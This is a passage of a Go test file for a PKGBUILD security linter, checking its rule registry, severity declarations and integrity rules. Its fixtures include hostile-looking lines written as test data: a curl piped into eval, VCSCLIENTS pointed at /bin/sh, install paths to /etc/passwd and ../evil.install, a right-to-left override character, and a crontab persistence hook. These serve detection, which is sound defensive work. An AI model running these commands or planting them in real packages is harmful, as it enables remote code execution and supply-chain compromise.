package rules

import (
	"encoding/json"
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"testing"

	"github.com/jmelahman/pkglint/internal/pkgbuild"
)

// lint writes the given files into a temp package dir and runs every rule.
func lint(t *testing.T, files map[string]string) []Finding {
	t.Helper()
	dir := t.TempDir()
	for name, content := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	pkg, err := pkgbuild.Load(dir)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	return Run(pkg, nil)
}

func ruleIDs(fs []Finding) map[string]int {
	out := map[string]int{}
	for _, f := range fs {
		out[f.RuleID]++
	}
	return out
}

const cleanPKGBUILD = `# Maintainer: Sam Coder <sam@example.com>
pkgname=demo
pkgver=1.0.0
pkgrel=1
pkgdesc='A demonstration tool'
arch=('x86_64')
url='https://github.com/example/demo'
license=('MIT')
source=("$pkgname-$pkgver.tar.gz::https://github.com/example/demo/archive/v$pkgver.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')

build() {
  cd "$pkgname-$pkgver"
  make
}

package() {
  cd "$pkgname-$pkgver"
  install -Dm755 demo "$pkgdir/usr/bin/demo"
}
`

func TestCleanPKGBUILDHasNoFindings(t *testing.T) {
	findings := lint(t, map[string]string{"PKGBUILD": cleanPKGBUILD})
	if len(findings) != 0 {
		t.Fatalf("expected no findings, got %+v", findings)
	}
}

func TestRegistryIsWellFormed(t *testing.T) {
	seen := map[string]bool{}
	names := map[string]string{}
	for _, r := range Registry() {
		if seen[r.ID] {
			t.Errorf("duplicate rule ID %s", r.ID)
		}
		seen[r.ID] = true
		if r.Name == "" || r.Doc == "" || r.Check == nil {
			t.Errorf("rule %s is missing name, doc, or check", r.ID)
		}
		// Lookup resolves a name as well as an ID — `pkglint explain
		// skipped-checksum` — so a name has to identify one rule, and must not
		// be spelled like an ID, which Lookup matches first and would shadow it.
		if prev, dup := names[r.Name]; dup {
			t.Errorf("rules %s and %s share the name %q", prev, r.ID, r.Name)
		}
		names[r.Name] = r.ID
		if _, isID := RuleByID(strings.ToUpper(r.Name)); isID {
			t.Errorf("rule %s is named %q, which is also a rule ID", r.ID, r.Name)
		}
		if r.Bad == "" || r.Good == "" {
			t.Errorf("rule %s is missing a Bad/Good example", r.ID)
		}
		// MaxSeverity is only meaningful above Severity: Severities() reads
		// anything at or below it as "unset", so a MaxSeverity that does not
		// escalate is silently ignored rather than wrong on the page.
		if r.MaxSeverity != 0 && r.MaxSeverity <= r.Severity {
			t.Errorf("rule %s sets MaxSeverity %s at or below Severity %s; drop it or raise it",
				r.ID, r.MaxSeverity, r.Severity)
		}
	}
}

// TestRuleSeveritiesAreDeclared keeps Rule.Severity and Rule.MaxSeverity in
// step with the checks. They are hand-written declarations about code that
// picks a severity per finding, so nothing but a test stops them drifting when
// a check grows a branch — and the rule reference publishes them as fact.
//
// Every finding a rule's own examples produce must land inside that rule's
// declared range. Examples cover the branch each was written for; the rules
// that escalate are pinned at both ends by TestEscalatingRulesReachBothEnds.
func TestRuleSeveritiesAreDeclared(t *testing.T) {
	index := map[string]Rule{}
	for _, r := range Registry() {
		index[r.ID] = r
	}
	within := func(t *testing.T, findings []Finding) {
		t.Helper()
		for _, f := range findings {
			r, ok := index[f.RuleID]
			if !ok {
				t.Errorf("finding for unregistered rule %s", f.RuleID)
				continue
			}
			if s := r.Severities(); f.Severity < s.Low || f.Severity > s.High {
				t.Errorf("%s reported %s, outside its declared %s..%s: %s",
					f.RuleID, f.Severity, s.Low, s.High, f.Message)
			}
		}
	}
	for _, r := range Registry() {
		t.Run(r.ID, func(t *testing.T) {
			within(t, lint(t, packageFor(r.ID, "bad", r.Bad)))
			within(t, lint(t, packageFor(r.ID, "good", r.Good)))
		})
	}
}

// TestFindingJSONRoundTrip pins that a Finding survives being written and read
// back. Severity encodes as a name rather than the int it is, so the two halves
// have to agree; when only the marshaler existed, anything that persisted
// findings as JSON wrote a file it could not load.
func TestFindingJSONRoundTrip(t *testing.T) {
	for _, sev := range []Severity{Info, Warn, Error, Critical} {
		t.Run(sev.String(), func(t *testing.T) {
			want := Finding{
				RuleID: "PB101", Severity: sev, Message: "a message",
				Path: "PKGBUILD", Line: 3, Col: 7,
			}
			b, err := json.Marshal(want)
			if err != nil {
				t.Fatal(err)
			}
			var got Finding
			if err := json.Unmarshal(b, &got); err != nil {
				t.Fatalf("unmarshal %s: %v", b, err)
			}
			if got != want {
				t.Errorf("round trip changed the finding:\n got %+v\nwant %+v", got, want)
			}
		})
	}
	t.Run("unknown name", func(t *testing.T) {
		var f Finding
		if err := json.Unmarshal([]byte(`{"severity":"catastrophic"}`), &f); err == nil {
			t.Error("expected an error for an unknown severity, got nil")
		}
	})
}

// The renderer marks anything it cannot resolve with a NUL, which rules test
// for internally. That sentinel must not survive into a message: a terminal, a
// JSON report and a SARIF file all render it as garbage, and %q turns it into a
// literal \x00 that reads like the PKGBUILD contains a corrupt filename.
func TestFindingMessagesCarryNoSentinel(t *testing.T) {
	files := map[string]string{
		"PKGBUILD": pkgbuildWith("", strings.Join([]string{
			`source=("http://example.com/${pkgver%%.*}/f.tar.gz")`,
			`sha256sums=('SKIP')`,
			`package() {`,
			`  install -Dm644 f.txt "/etc/$(id -un)/f.conf"`,
			`}`,
		}, "\n")),
	}
	var checked int
	for _, f := range lint(t, files) {
		if strings.ContainsAny(f.Message, "\x00") || strings.Contains(f.Message, `\x00`) {
			t.Errorf("[%s] message leaks the unresolvable sentinel: %q", f.RuleID, f.Message)
		}
		if strings.Contains(f.Message, "…") {
			checked++
		}
	}
	// Guards against the fixture quietly ceasing to produce an unresolvable
	// word, which would leave the assertion above passing vacuously.
	if checked == 0 {
		t.Error("no finding quoted an unresolvable expansion; the fixture no longer exercises the sanitizer")
	}
}

// TestEscalatingRulesReachBothEnds pins the rules that report more than one
// severity. Containment alone cannot catch a range that is too wide: a rule
// declared warn..critical that in fact only ever reports warn passes every
// other check here while overstating itself on the rule reference. So each
// entry below drives the rule to both ends of what it declares, and the list
// must name every rule whose range varies — a new escalation gets a fixture,
// not a free pass.
func TestEscalatingRulesReachBothEnds(t *testing.T) {
	// low and high are packages that should drive the rule to the bottom and
	// the top of its declared range.
	cases := map[string]struct{ low, high map[string]string }{
		"PB108": {
			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "PACKAGER='Someone <a@b.c>'")},
			high: map[string]string{"PKGBUILD": pkgbuildWith("", "VCSCLIENTS=('git::/bin/sh')")},
		},
		"PB104": {
			low: map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('http://example.com/demo.tar.gz')
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")},
			high: map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('http://example.com/demo.tar.gz')
sha256sums=('SKIP')`, "")},
		},
		"PB210": {
			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  npm install -g typescript@5.4.5\n}")},
			high: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  npm install axios\n}")},
		},
		"PB302": {
			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  eval \"echo hi\"\n}")},
			high: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  eval \"$(curl -s https://example.com/x)\"\n}")},
		},
		"PB306": {
			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  $(printf make) all\n}")},
			high: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  ${!runner} all\n}")},
		},
		"PB309": {
			// U+200B ZERO WIDTH SPACE, then U+202E RIGHT-TO-LEFT OVERRIDE.
			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  make​ all\n}")},
			high: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  make‮ all\n}")},
		},
		"PB502": {
			low: map[string]string{
				"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
				"demo.install": "post_install() {\n  systemctl enable demo.service\n}\n",
			},
			high: map[string]string{
				"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
				"demo.install": "post_install() {\n  crontab /usr/share/demo/cron\n}\n",
			},
		},
	}

	for _, r := range Registry() {
		s := r.Severities()
		_, pinnedHere := cases[r.ID]
		// Package-scope rules are driven through archive fixtures in
		// TestPackageEscalatingRulesReachBothEnds instead.
		pinned := pinnedHere || packageEscalationCases[r.ID]
		if s.Varies() != pinned {
			t.Errorf("%s declares %s..%s but %s in TestEscalatingRulesReachBothEnds",
				r.ID, s.Low, s.High, map[bool]string{true: "is pinned", false: "is not pinned"}[pinned])
		}
	}

	// reports asserts the rule fires on files and that want is among the
	// severities it reports there.
	reports := func(t *testing.T, id string, files map[string]string, want Severity) {
		t.Helper()
		var got []Severity
		for _, f := range lint(t, files) {
			if f.RuleID == id {
				got = append(got, f.Severity)
				if f.Severity == want {
					return
				}
			}
		}
		t.Errorf("%s: want a %s finding, got %v", id, want, got)
	}
	for id, tc := range cases {
		r, ok := RuleByID(id)
		if !ok {
			t.Errorf("unknown rule %s", id)
			continue
		}
		t.Run(id, func(t *testing.T) {
			s := r.Severities()
			reports(t, id, tc.low, s.Low)
			reports(t, id, tc.high, s.High)
		})
	}
}

// expectRule asserts that linting files yields at least one finding for id.
func expectRule(t *testing.T, id string, files map[string]string) {
	t.Helper()
	ids := ruleIDs(lint(t, files))
	if ids[id] == 0 {
		t.Errorf("expected %s, got %v", id, ids)
	}
}

// expectNoRule asserts that linting files yields no finding for id.
func expectNoRule(t *testing.T, id string, files map[string]string) {
	t.Helper()
	ids := ruleIDs(lint(t, files))
	if ids[id] != 0 {
		t.Errorf("expected no %s, got %v", id, ids)
	}
}

func pkgbuildWith(header, body string) string {
	if header == "" {
		header = `pkgname=demo
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url='https://example.com/demo'
license=('MIT')
source=("https://example.com/demo-$pkgver.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`
	}
	return header + "\n" + body + "\n"
}

func TestIntegrityRules(t *testing.T) {
	t.Run("PB101 skipped checksum on remote tarball", func(t *testing.T) {
		expectRule(t, "PB101", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo.tar.gz")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB101 not for VCS sources", func(t *testing.T) {
		expectNoRule(t, "PB101", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git#commit=abc123")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB101 not for file:// sources", func(t *testing.T) {
		expectNoRule(t, "PB101", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("file://calibri.ttf")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB102 md5-only digests", func(t *testing.T) {
		expectRule(t, "PB102", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo.tar.gz")
md5sums=('0123456789abcdef0123456789abcdef')`, "")})
	})
	t.Run("PB102 not when sha256 also present", func(t *testing.T) {
		expectNoRule(t, "PB102", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo.tar.gz")
md5sums=('0123456789abcdef0123456789abcdef')
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB103 mutable tag pin", func(t *testing.T) {
		expectRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git#tag=v1")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB103 not for a -git package following a branch", func(t *testing.T) {
		expectNoRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo-git
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git")
sha256sums=('SKIP')`, "")})
		expectNoRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo-git
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git#branch=main")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB103 -git exemption reads through pkgbase and variables", func(t *testing.T) {
		expectNoRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`_pkgname=demo
pkgbase=$_pkgname-git
pkgname=($_pkgname-git $_pkgname-docs)
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB103 -git package pinned to a mutable tag is still flagged", func(t *testing.T) {
		// The suffix licenses following upstream's tip, not a re-pointable tag.
		expectRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo-git
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git#tag=v1")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB103 -git does not exempt a source from another VCS", func(t *testing.T) {
		expectRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo-git
pkgver=1
pkgrel=1
url='https://example.com'
source=("svn+https://example.com/demo/trunk")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB103 commit pin is fine", func(t *testing.T) {
		expectNoRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git#commit=0123abc")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB104 plain http source", func(t *testing.T) {
		expectRule(t, "PB104", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("http://example.com/demo.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB105 source host differs from url host", func(t *testing.T) {
		expectRule(t, "PB105", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://project.example.com'
source=("https://cdn.sketchy.io/demo.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB105 not for file:// sources", func(t *testing.T) {
		expectNoRule(t, "PB105", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://project.example.com'
source=("file://courbi.ttf")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB105 github raw content allowed", func(t *testing.T) {
		expectNoRule(t, "PB105", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://github.com/example/demo'
source=("https://raw.githubusercontent.com/example/demo/main/x.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB106 DLAGENTS override", func(t *testing.T) {
		expectRule(t, "PB106", map[string]string{"PKGBUILD": pkgbuildWith("",
			`DLAGENTS=('https::/usr/bin/curl -o %o %u')`)})
	})
	t.Run("PB107 missing install script", func(t *testing.T) {
		expectRule(t, "PB107", map[string]string{"PKGBUILD": pkgbuildWith("", `install=demo.install`)})
	})
	// A name with a separator must be reported without ever stat-ing the path
	// it points at: the joined path would leave the package directory, and the
	// finding is republished, so a bare stat is an existence oracle.
	t.Run("PB107 traversal name", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": pkgbuildWith("", `install=../evil.install`)}
		expectRule(t, "PB107", files)
		var msg string
		for _, f := range lint(t, files) {
			if f.RuleID == "PB107" {
				msg = f.Message
			}
		}
		if !strings.Contains(msg, "plain file name") {
			t.Errorf("PB107 message = %q, want one mentioning \"plain file name\"", msg)
		}
	})
	t.Run("PB107 absolute path to an existing host file", func(t *testing.T) {
		expectRule(t, "PB107", map[string]string{"PKGBUILD": pkgbuildWith("", `install=/etc/passwd`)})
	})
	t.Run("PB107 present scriptlet stays silent", func(t *testing.T) {
		expectNoRule(t, "PB107", map[string]string{
			"PKGBUILD":     pkgbuildWith("", `install=demo.install`),
			"demo.install": "post_install() {\n  :\n}\n",
		})
	})
	t.Run("PB108 command-executing makepkg.conf override", func(t *testing.T) {
		expectRule(t, "PB108", map[string]string{"PKGBUILD": pkgbuildWith("",
			`VCSCLIENTS=('git::/tmp/evil-git')`)})
	})
	t.Run("PB108 trust-affecting override", func(t *testing.T) {
		expectRule(t, "PB108", map[string]string{"PKGBUILD": pkgbuildWith("",
			`PACKAGER='Trusted Maintainer <root@example.com>'`)})
	})
	t.Run("PB108 leaves ordinary build vars alone", func(t *testing.T) {
		expectNoRule(t, "PB108", map[string]string{"PKGBUILD": pkgbuildWith("",
			`MAKEFLAGS="-j$(nproc)"`)})
	})
	t.Run("PB109 same forge, different owner", func(t *testing.T) {
		expectRule(t, "PB109", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://github.com/upstream/demo'
source=("git+https://github.com/somebodyelse/demo.git#commit=0123abc")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB109 same forge and owner is fine", func(t *testing.T) {
		expectNoRule(t, "PB109", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://github.com/upstream/demo'
source=("git+https://github.com/upstream/demo.git#commit=0123abc")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB110 checksum count mismatch", func(t *testing.T) {
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/a.tar.gz" "https://example.com/b.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 matched counts are fine", func(t *testing.T) {
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith("", "")})
	})
	t.Run("PB110 counts through an array-reference source", func(t *testing.T) {
		// The ttf-ms-fonts shape: one written element, three real sources.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
_files=('a.bin' 'b.bin' 'c.bin')
_dlpath='https://example.com/pub'
source=("${_files[@]/#/$_dlpath/}")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 mismatch through an array-reference source", func(t *testing.T) {
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
_files=('a.bin' 'b.bin' 'c.bin')
_dlpath='https://example.com/pub'
source=("${_files[@]/#/$_dlpath/}")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 counts brace-expanded checksums", func(t *testing.T) {
		// The shadps4-git shape: one written sums element covering every VCS
		// source. `SKIP{,,,}` is four checksums to makepkg, not one.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/a.git" "git+https://example.com/b.git"
        "git+https://example.com/c.git" "git+https://example.com/d.git")
sha256sums=(SKIP{,,,})`, "")})
	})
	t.Run("PB110 brace-expanded checksums still short is flagged", func(t *testing.T) {
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/a.git" "git+https://example.com/b.git"
        "git+https://example.com/c.git" "git+https://example.com/d.git")
sha256sums=(SKIP{,})`, "")})
	})
	t.Run("PB114 brace-expanded SKIP is not a malformed digest", func(t *testing.T) {
		expectNoRule(t, "PB114", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/a.git" "git+https://example.com/b.git"
        "git+https://example.com/c.git" "git+https://example.com/d.git")
sha256sums=(SKIP{,,,})`, "")})
	})
	t.Run("PB114 brace expansion still catches a short digest", func(t *testing.T) {
		expectRule(t, "PB114", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/a.tar.gz" "https://example.com/b.tar.gz")
sha256sums=(dead{beef,f00d})`, "")})
	})
	t.Run("PB110 skips a source array it cannot size", func(t *testing.T) {
		// _files is only built inside prepare(), so the top-level reference has
		// no statically known length; a mismatch claim would be a guess.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("${_files[@]}")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 skips arrays a top-level conditional extends", func(t *testing.T) {
		// makepkg runs the `if` before it reads the metadata, so the arrays it
		// sees are three long; only the unconditional halves are visible here.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('https://example.com/a.tar.gz' 'https://example.com/b.tar.gz')
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')
if [ "$CARCH" = 'x86_64' ]; then
  source+=('https://example.com/c.tar.gz')
  sha256sums+=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')
fi`, "")})
	})
	t.Run("PB110 still counts when only a function assigns", func(t *testing.T) {
		// A function body runs long after makepkg has read the metadata, so it
		// cannot be the reason the counts disagree.
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('https://example.com/a.tar.gz' 'https://example.com/b.tar.gz')
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, `
prepare() {
  source+=('https://example.com/c.tar.gz')
}`)})
	})
	t.Run("PB110 empty sums array beside a covering one is fine", func(t *testing.T) {
		// An empty array retires an algorithm; makepkg only needs one that
		// matches, and only raises "differ in size" for a non-empty one.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('https://example.com/a.tar.gz')
md5sums=()
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 empty sums array with nothing covering is flagged", func(t *testing.T) {
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('git+https://example.com/demo.git#tag=v1')
sha256sums=()`, "")})
	})
	t.Run("PB110 skips an array built by an unquoted command substitution", func(t *testing.T) {
		// bash word-splits what _urls() prints, so that one written element is
		// however many sources the function emits — three here, not one.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=($(_urls))
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, `
_urls() {
  echo https://example.com/a.tar.gz
  echo https://example.com/b.tar.gz
  echo https://example.com/c.tar.gz
}`)})
	})
	t.Run("PB110 still counts a quoted command substitution", func(t *testing.T) {
		// In quotes it cannot split, so it really is the one source it looks like.
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("$(_url)")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 skips an array holding an unquoted glob", func(t *testing.T) {
		// bash expands *.md against the build directory, so how many sources
		// that element is depends on what is sitting next to the PKGBUILD.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('https://example.com/a.tar.gz' *.md)
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 still counts an unquoted URL with a query string", func(t *testing.T) {
		// bash leaves an unmatched glob literal, and a URL can never match a
		// pathname, so the `?` here is a query string and the count holds.
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=(https://example.com/download.php?file=demo.tar.gz)
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 still counts a quoted asterisk", func(t *testing.T) {
		// Quoted it is a literal filename, however odd, and pairs one-to-one.
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('https://example.com/a.tar.gz' '*.md')
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 counts a source naming a brace-expanded pkgname", func(t *testing.T) {
		// "$pkgname" is "${pkgname[0]}", and bash brace-expands the assignment
		// before indexing it: element zero is "demo", not "demo{,-extra}".
		// Splicing the written form would leave braces for a later pass to
		// re-expand, turning this one source into two.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgbase=demo
pkgname=(demo{,-extra})
pkgver=1
pkgrel=1
url='https://example.com'
source=("$pkgname-$pkgver-LICENSE.txt::https://example.com/LICENSE")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, `
package_demo() { :; }
package_demo-extra() { :; }`)})
	})
	t.Run("PB110 skips an array a top-level conditional assigns as a scalar", func(t *testing.T) {
		// `source="x"` then `source+=(a b c)` is four elements to bash: the
		// append folds the scalar in as element zero.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
if [ -n "$SOMETHING" ]; then
  source='https://example.com/a.tar.gz'
else
  source='https://example.com/b.tar.gz'
fi
source+=('local.conf' 'other.conf')
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})

	sigNoKeys := `pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo-1.tar.gz"
        "https://example.com/demo-1.tar.gz.sig")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef' 'SKIP')`
	sigWithKeys := sigNoKeys + `
validpgpkeys=('ABAF11C65A2970B130ABE3C479BE3E4300411886')`

	t.Run("PB111 signature without validpgpkeys", func(t *testing.T) {
		expectRule(t, "PB111", map[string]string{"PKGBUILD": pkgbuildWith(sigNoKeys, "")})
	})
	t.Run("PB111 not when keys are pinned", func(t *testing.T) {
		expectNoRule(t, "PB111", map[string]string{"PKGBUILD": pkgbuildWith(sigWithKeys, "")})
	})
	t.Run("PB111 signed VCS source without keys", func(t *testing.T) {
		expectRule(t, "PB111", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git?signed#tag=v1")
sha256sums=('SKIP')`, "")})
